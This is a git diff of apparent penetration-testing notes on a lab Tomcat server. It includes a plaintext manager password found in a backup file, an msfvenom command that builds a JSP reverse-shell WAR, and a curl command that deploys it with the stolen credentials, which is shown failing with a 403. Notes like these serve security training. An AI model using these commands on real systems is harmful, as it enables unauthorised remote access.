@@ -251,8 +251,29 @@ barry@nix03:/etc/tomcat9$ cat *bak | grep username
  <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
 ```
 
-Tomcat version
-```
+Tomcat version is 9.0.31. I can also determine the version via the 
+```python
 curl -s http://10.129.85.233:8080/docs/ | grep Tomcat 
 ```
+
+MSF Venom Reverse Shell
+```python
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.129.85.233 LPORT=8888 -f war -o revshell.war
+```
+
+
+Upload war file
+```python
+curl --upload-file revshell.war -u 'tomcatadm:T0mc@t_s3cret_p@ss!' "http://10.129.85.233:8080/manager/text/deploy?path=/monshell"
+```
+
+Received a "403 Access Denied" message
+>[!info ] 
+> "You are not authorized to view this page. By default the Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you'll need to edit the Manager's context.xml file."
+
+
+
+
+
+
 
